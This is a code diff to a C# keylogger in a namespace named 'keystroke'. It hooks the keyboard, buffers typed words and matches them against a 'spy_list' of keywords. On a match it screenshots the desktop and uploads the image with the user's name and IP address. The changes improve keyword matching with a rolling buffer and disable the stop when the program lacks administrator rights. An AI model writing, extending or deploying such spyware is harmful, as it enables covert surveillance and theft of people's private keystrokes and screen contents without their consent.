@@ -28,6 +28,8 @@ namespace keystroke
 
         private static string word = "";
         private static List<string> spy_list = new List<string>();
+        private static List<string> word_list = new List<string>();
+        private static int max_word_length = 0;
 
         private static string SERVER_ADDRESS = "";
 
@@ -69,7 +71,7 @@ namespace keystroke
             catch (Exception ex)
             {
                 MessageBox.Show("Please run as administrator");
-                return;
+                //return;
             }
 
             //MessageBox.Show("You are welcome1");
@@ -129,10 +131,19 @@ namespace keystroke
             }
 
             string[] list = result.Split(',');
+
+            max_word_length = 0;
+
             for (int i = 0; i < list.Count(); i++)
             {
-                spy_list.Add(list[i]);
+                string word = list[i].Trim();
+                if (word.Length > max_word_length)
+                    max_word_length = word.Length;
+
+                spy_list.Add(word);
             }
+
+
         }
 
         private static string GetLocalIPAddress()
@@ -188,26 +199,29 @@ namespace keystroke
 
                 if (vkCode == 13 || vkCode == 9 || vkCode == 32)
                 {
-                    bool exist = false;
+                    int index = -1;
 
                     for (int i = 0; i < spy_list.Count; i++)
                     {
                         if (word.ToLower().Contains(spy_list[i].ToLower()))
                         {
-                            exist = true;
+                            index = i;
                             break;
                         }
                     }
 
-                    if (exist == true)
+                    if (index >= 0)
                     {
                         string path = takeScreenshot();
                         string urName = System.Environment.UserName;
                         string ipAddr = GetLocalIPAddress();
-                        uploadImage(path, urName, ipAddr, word);
+                        uploadImage(path, urName, ipAddr, spy_list[index]);
                     }
 
-                    word = "";
+                    if( vkCode == 32 )
+                        word += " ";
+                    if( vkCode == 9 )
+                        word += " ";
                 }
                 else
                 {
@@ -228,7 +242,8 @@ namespace keystroke
                     Console.WriteLine(word);
                 }
 
-
+                if (word.Length > max_word_length)
+                    word = word.Substring(word.Length - max_word_length - 1);
             }
 
             return CallNextHookEx(_hookID, nCode, wParam, lParam);
